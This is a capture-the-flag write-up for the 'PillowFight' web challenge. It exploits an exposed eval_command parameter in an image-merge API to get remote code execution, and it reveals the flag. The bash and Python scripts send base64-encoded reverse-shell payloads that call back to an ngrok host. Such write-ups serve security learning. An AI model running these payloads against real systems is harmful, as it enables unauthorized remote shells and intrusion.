## Name: PillowFight
#### Author: @HuskyHacks
#### Category: Web
#### Difficulty: N/D
#### Description: PillowFight uses advanced AI/MLRegressionLearning* to combine two images of your choosing
*note to investors this is not techically true at the moment we're using a python library but please give us money and we'll deliver it we promise.

## Procedure
The website ask for two png file to merge, for this it uses Python Pillow 8.4.0.

![Screenshot 2024-10-25 at 1 30 11 PM](https://github.com/user-attachments/assets/1a5f138c-4531-47b5-a0d1-60ae10e5c71c)

The API documentation we can see the path ```combine``` this allow only ```http POST request```, this ask for ```image1```, ```image2``` but has another interesting input ```eval_command``` this allows us to execute an RCE.
![Screenshot 2024-10-25 at 3 11 54 PM](https://github.com/user-attachments/assets/1e6821bb-64f1-4484-bd11-73f0a661c7df)

we can get our shell with the following bash script, we need to use ngrok to get the shell
```
#!/bin/bash

revshell=$(echo -n "sh -i >& /dev/tcp/2.tcp.ngrok.io/18745 0>&1"|base64)
payload="__import__('os').system('echo $revshell| base64 -d | bash')"
echo "payload = $payload"

curl -X POST "http://challenge.ctf.games:32742/combine" \
-H  "accept: image/png" -H  "Content-Type: multipart/form-data" \
-F "image1=@image.png;type=image/png" -F "image2=@image.png;type=image/png" \
-F "eval_command=$payload"

```

We have already ```root``` permission, so just need to read our flag.txt file.
![Screenshot 2024-10-25 at 3 13 02 PM](https://github.com/user-attachments/assets/d31bec9a-c1b7-4b78-a140-3d58137e3203)

![Screenshot 2024-10-25 at 3 13 28 PM](https://github.com/user-attachments/assets/091f3c11-c8e1-4150-a12c-1aa232642993)


flag ```flag{b6b62e6c5cdfda3b3a8b87d90fd48d01}```


### Bonus
Another way to get the shell but with a python script
```
import requests

url = "http://challenge.ctf.games:30550/combine"

file_png = open('image.png', 'rb').read()
files = {
    "image1": file_png,
    "image2": file_png
}

eval_command2 = f"__import__('os').system('echo c2ggLWkgPiYgL2Rldi90Y3AvNi50Y3Aubmdyb2suaW8vMTA1NzIgMD4mMQ== | base64 -d | bash')"

data= {
    "eval_command": eval_command2
}

res = requests.post(url,files=files,data=data)
print(res.text)
```

